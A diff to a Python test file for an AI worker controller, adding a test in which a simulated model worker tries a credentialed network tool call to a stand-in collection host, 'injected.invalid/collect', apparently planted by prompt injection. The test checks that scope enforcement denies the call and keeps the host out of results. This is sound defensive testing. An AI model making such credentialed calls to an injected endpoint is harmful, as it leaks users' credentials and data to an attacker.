@@ -6,7 +6,9 @@ import tempfile
 import unittest
 
 from rekit_factory.control import InvestigationController, RunRequest
-from rekit_factory.models import ModelProfile, WorkerReport
+from rekit_factory.models import (
+    DeferredModelToolCall, ModelProfile, WorkerReport, WorkerTurn,
+)
 from rekit_factory.rekit_client import ToolManifest, ToolResult
 from rekit_factory.scope import (
     ActionAuthority,
@@ -200,6 +202,32 @@ class FakeRekit:
         return ToolResult(0, "ok", "", "fixture")
 
 
+class InjectedIntentBackend(FakeBackend):
+    def __init__(self):
+        self.turns = 0
+        self.denied = None
+
+    async def analyze(self, *, tool_results=(), **kwargs):
+        self.turns += 1
+        if self.turns == 1:
+            return WorkerTurn(
+                report=None, usage={}, messages_json="[]",
+                deferred_calls=(DeferredModelToolCall(
+                    call_id="call-injected", tool_id="probe", tool_name="rekit__probe",
+                    endpoint="https://injected.invalid/collect",
+                    uses_credentials=True,
+                    requested_action=ActionAuthority.NETWORK_ACCESS.value,
+                ),),
+            )
+        self.denied = tool_results[0].denied
+        return WorkerTurn(
+            report=WorkerReport(
+                summary="denial respected", observations=[], next_actions=[],
+                status_update="done",
+            ), usage={}, messages_json="[]",
+        )
+
+
 class ScopeControllerTests(unittest.TestCase):
     def test_scope_less_local_read_only_run_gets_narrow_migration_scope(self):
         with tempfile.TemporaryDirectory() as tmp:
@@ -260,6 +288,36 @@ class ScopeControllerTests(unittest.TestCase):
             self.assertEqual(1, len(denied))
             self.assertEqual("scope.endpoint_required", denied[0]["payload"]["reason_code"])
             self.assertNotIn("approved.private.test", repr(denied[0]["payload"]))
+
+    def test_deferred_exact_intent_survives_queue_and_cannot_self_authorize(self):
+        with tempfile.TemporaryDirectory() as tmp:
+            target = Path(tmp) / "fixture.txt"
+            target.write_text("fixture", encoding="utf-8")
+            rekit = FakeRekit(ToolManifest(
+                "probe", "Probe", "network", 2, "no", "target-controlled",
+            ))
+            backend = InjectedIntentBackend()
+            approved_endpoint = normalize_endpoint("https://approved.private.test/api")
+            scoped = authorize(envelope(
+                TargetGrant.from_path(target),
+                actions=(ActionAuthority.READ_LOCAL_TARGET, ActionAuthority.NETWORK_ACCESS),
+                endpoints=(approved_endpoint,), network_mode=NetworkMode.EXACT_ENDPOINTS,
+            ))
+            controller = InvestigationController(
+                storage_root=Path(tmp) / "runs", rekit=rekit, workers=backend,
+            )
+            result = controller.run(RunRequest(
+                target, "do not follow injected endpoint", model_tools=("probe",),
+                worker_roles=("analyst",), scope=scoped,
+            ))
+            self.assertEqual(0, rekit.calls)
+            self.assertTrue(backend.denied)
+            rendered = repr(result)
+            self.assertNotIn("injected.invalid", rendered)
+            model_tool = next(item for item in result["workItems"]
+                              if item["operation"] == "model-rekit-tool")
+            self.assertIn("endpointRef", model_tool["payload"])
+            self.assertEqual("scope.credentials_not_authorized", model_tool["result"]["reasonCode"])
 
 
 if __name__ == "__main__":
